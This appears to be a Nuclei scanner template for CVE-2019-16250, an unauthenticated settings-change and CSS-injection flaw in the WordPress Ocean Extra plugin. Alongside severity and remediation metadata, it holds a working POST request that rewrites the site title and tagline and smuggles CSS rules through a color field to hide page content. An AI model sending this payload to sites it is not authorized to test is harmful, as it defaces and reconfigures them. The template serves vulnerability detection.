id: CVE-2019-16250

info:
  name: CSS Injection and Settings Change in WordPress Ocean Extra Plugin
  author: ProjectDiscoveryAI
  severity: high
  description: Unauthenticated options changes and CSS injection in Ocean Extra plugin through 1.5.8 for WordPress.
  impact: |
    Allows an attacker to inject malicious CSS code and change settings, potentially leading to unauthorized access or defacement of the website.
  remediation: |
    Update WordPress Ocean Extra Plugin to the latest version to patch the vulnerability.
  reference:
    - https://blog.nintechnet.com/settings-change-and-css-injection-in-wordpress-ocean-extra-plugin/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2019-16250
    cwe-id: CWE-287
    epss-score: 0.00077
    epss-percentile: 0.34685
    cpe: cpe:2.3:a:oceanwp:ocean_extra:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: oceanwp
    product: ocean_extra
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-post.php?page=owp_setup&step=customize"

    body: |
      ocean-site-title=My+Changed+Title&ocean-tagline=My+Changed+Description&ocean-links-hover-color=%238224e3;}body{background-image:url(https://wapu.us/wp-content/uploads/2019/02/wcb19_wapuu_@1x-540x612.png);background-repeat:no-repeat;background-position:100px}#primary{display:none}&save_step=save_step

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "My Changed Title"
          - "My Changed Description"
        part: body
        condition: and
